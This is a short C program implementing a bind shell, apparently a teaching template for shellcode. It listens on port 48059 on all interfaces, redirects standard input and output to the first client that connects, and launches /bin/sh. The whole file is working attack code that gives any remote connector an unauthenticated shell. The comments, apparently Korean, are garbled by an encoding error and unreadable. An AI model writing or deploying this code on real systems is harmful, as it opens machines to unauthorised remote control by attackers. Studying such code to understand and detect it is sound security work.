#include<sys/socket.h>			// ������ ����� �� ����� ���̺귯��
#include<netinet/in.h>			// sockaddr ����ü ����
int main(){
	char * shell[2];		// execve ȣ�� �غ�
	int server,client;		// ���� ����� �ڵ�
	struct sockaddr_in serv_addr;	// IP/��Ʈ �� ����� ����ü

	server=socket(2,1,0);		// ��Ʈ�� ������ ���� IP ���� �����
	serv_addr.sin_addr.s_addr=0; 	// ��� ����ȣ��Ʈ IP�� ���� �ּҸ� ����
	serv_addr.sin_port=0xBBBB;	// ���� ��Ʈ ����, ���⼭�� 48059
	serv_addr.sin_family=2;		// ����Ƽ�� �������� �йи�: IP
	bind(server,(struct sockaddr *)&serv_addr,0x10); // ���� ����
	listen(server,0);		// ���� ��� ���� ����
	client=accept(server,0,0);	// ����Ǹ� Ŭ���̾�Ʈ �ڵ� ��ȯ
	/* Ŭ���̾�Ʈ �������� stdin,stdout,stderr�� ���� */
	dup2(client,0);			// stdin�� Ŭ���̾�Ʈ�� ����
	dup2(client,1);			// stdout�� Ŭ���̾�Ʈ�� ����
	dup2(client,2);			// stderr�� Ŭ���̾�Ʈ�� ����
	shell[0]="/bin/sh";		// execve�� ù ��° �μ�
	shell[1]=0;			// �迭�� null�� �ʱ�ȭ
	execve(shell[0],shell,0);	// ���� ��
}
